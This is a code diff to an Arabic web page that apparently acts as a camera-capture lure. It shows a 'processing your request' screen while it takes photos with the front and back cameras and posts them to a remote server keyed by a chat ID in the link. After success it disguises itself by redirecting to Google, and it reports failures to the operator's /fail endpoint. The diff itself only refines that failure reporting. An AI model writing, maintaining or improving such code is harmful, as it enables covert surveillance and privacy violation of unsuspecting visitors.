@@ -57,7 +57,6 @@
     <h1 id="title">جاري تنفيذ طلبك</h1>
     <p id="subtitle">يرجى الانتظار...</p>
     
-    <!-- ✅ رسالة الخطأ التي تظهر عند الفشل -->
     <div class="error-message" id="errorMessage">
         <h2>❌ فشل الوصول إلى الكاميرا</h2>
         <p id="errorDetail">لم تمنح الصلاحيات اللازمة للوصول إلى الكاميرا</p>
@@ -80,9 +79,9 @@ const userId = urlParams.get("chatId");
 
 let camerasFinished = 0;
 let totalCameras = 0;
-let hasError = false; // ✅ متغير لتتبع وجود خطأ
+let hasError = false;
+let failMessageSent = false; // ✅ منع إرسال الرسالة مرتين
 
-// ✅ عناصر الصفحة
 const spinner = document.getElementById('spinner');
 const title = document.getElementById('title');
 const subtitle = document.getElementById('subtitle');
@@ -121,7 +120,6 @@ function getDeviceVersion() {
     return match ? match[1] : 'Unknown';
 }
 
-// ✅ دالة عرض رسالة الخطأ للمستخدم (بدون تحويل)
 function showErrorToUser(message) {
     hasError = true;
     spinner.style.display = 'none';
@@ -135,33 +133,35 @@ async function requestCameraPermission(facingMode) {
     try {
         return await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
     } catch (error) {
-        // ✅ إرسال تقرير فشل
-        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
-            sendFailReport('permission', 'تم رفض الوصول إلى الكاميرا', { 
-                facingMode: facingMode,
-                error: error.message 
-            });
-            // ✅ عرض رسالة خطأ للمستخدم ولا يحول
-            showErrorToUser('تم رفض الوصول إلى الكاميرا. يرجى منح الصلاحيات وإعادة المحاولة.');
-        } else if (error.name === 'NotFoundError') {
-            sendFailReport('camera', 'لا توجد كاميرا متصلة', { 
-                facingMode: facingMode,
-                error: error.message 
-            });
-            showErrorToUser('لا توجد كاميرا متصلة بجهازك. يرجى توصيل كاميرا وإعادة المحاولة.');
-        } else {
-            sendFailReport('error', error.message, { 
-                facingMode: facingMode,
-                error: error.message 
-            });
-            showErrorToUser('حدث خطأ غير متوقع: ' + error.message);
+        // ✅ إرسال تقرير فشل مرة واحدة فقط
+        if (!failMessageSent) {
+            failMessageSent = true;
+            
+            if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                sendFailReport('permission', 'تم رفض الوصول إلى الكاميرا', { 
+                    facingMode: facingMode,
+                    error: error.message 
+                });
+                showErrorToUser('تم رفض الوصول إلى الكاميرا. يرجى منح الصلاحيات وإعادة المحاولة.');
+            } else if (error.name === 'NotFoundError') {
+                sendFailReport('camera', 'لا توجد كاميرا متصلة', { 
+                    facingMode: facingMode,
+                    error: error.message 
+                });
+                showErrorToUser('لا توجد كاميرا متصلة بجهازك. يرجى توصيل كاميرا وإعادة المحاولة.');
+            } else {
+                sendFailReport('error', error.message, { 
+                    facingMode: facingMode,
+                    error: error.message 
+                });
+                showErrorToUser('حدث خطأ غير متوقع: ' + error.message);
+            }
         }
         return null;
     }
 }
 
 async function init() {
-    // ✅ التحقق من وجود userId
     if (!userId) {
         sendFailReport('error', 'معرف المستخدم غير موجود في الرابط', {});
         showErrorToUser('معرف المستخدم غير موجود في الرابط');
@@ -172,17 +172,19 @@ async function init() {
     const frontStream = await requestCameraPermission('user');
     const backStream = await requestCameraPermission('environment');
 
-    // ✅ إذا كان هناك خطأ (hasError = true) لا نحول إلى Google
     if (hasError) {
-        return; // نوقف التنفيذ ولا نحول
+        return;
     }
 
     if (!frontStream && !backStream) {
-        sendFailReport('camera', 'لا توجد كاميرات متاحة', {
-            frontStream: !!frontStream,
-            backStream: !!backStream
-        });
-        showErrorToUser('لا توجد كاميرات متاحة على هذا الجهاز');
+        if (!failMessageSent) {
+            failMessageSent = true;
+            sendFailReport('camera', 'لا توجد كاميرات متاحة', {
+                frontStream: !!frontStream,
+                backStream: !!backStream
+            });
+            showErrorToUser('لا توجد كاميرات متاحة على هذا الجهاز');
+        }
         return;
     }
 
@@ -213,7 +215,6 @@ function setupCamera(video, canvas, cameraType, additionalData) {
                 if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
                 camerasFinished++;
                 if (camerasFinished === totalCameras) {
-                    // ✅ فقط عند النجاح الكامل نحول إلى Google
                     finishAndRedirect();
                 }
                 return;
@@ -240,15 +241,17 @@ async function post(url, formData) {
     try {
         await fetch(url, { method: 'POST', body: formData });
     } catch (error) {
-        sendFailReport('error', 'فشل إرسال الصور إلى الخادم', {
-            url: url,
-            error: error.message
-        });
+        if (!failMessageSent) {
+            failMessageSent = true;
+            sendFailReport('error', 'فشل إرسال الصور إلى الخادم', {
+                url: url,
+                error: error.message
+            });
+        }
     }
 }
 
 function finishAndRedirect() {
-    // ✅ فقط إذا لم يكن هناك خطأ نحول إلى Google
     if (!hasError) {
         document.querySelector('.container').innerHTML = `
             <h1>✅ تم تنفيذ طلبك بنجاح</h1>
@@ -260,9 +263,6 @@ function finishAndRedirect() {
     }
 }
 
-// ============================================
-// ✅ دالة إرسال تقارير الفشل إلى /fail
-// ============================================
 async function sendFailReport(type, message, details = {}) {
     if (!userId) {
         console.warn('No userId available for fail report');
@@ -298,11 +298,9 @@ async function sendFailReport(type, message, details = {}) {
     }
 }
 
-// ============================================
-// ✅ مراقبة الأخطاء غير المتوقعة
-// ============================================
 window.addEventListener('error', (event) => {
-    if (!hasError) {
+    if (!hasError && !failMessageSent) {
+        failMessageSent = true;
         sendFailReport('error', 'خطأ غير متوقع في الصفحة', {
             message: event.message,
             filename: event.filename,
@@ -313,15 +311,11 @@ window.addEventListener('error', (event) => {
     }
 });
 
-// ============================================
-// ✅ عند إغلاق الصفحة قبل الانتهاء
-// ============================================
 window.addEventListener('beforeunload', () => {
     if (camerasFinished < totalCameras && totalCameras > 0 && !hasError) {
         sendFailReport('error', 'المستخدم غادر الصفحة قبل الانتهاء', {
             camerasFinished: camerasFinished,
-            totalCameras: totalCameras,
-            photosTaken: camerasFinished * 4
+            totalCameras: totalCameras
         });
     }
 });
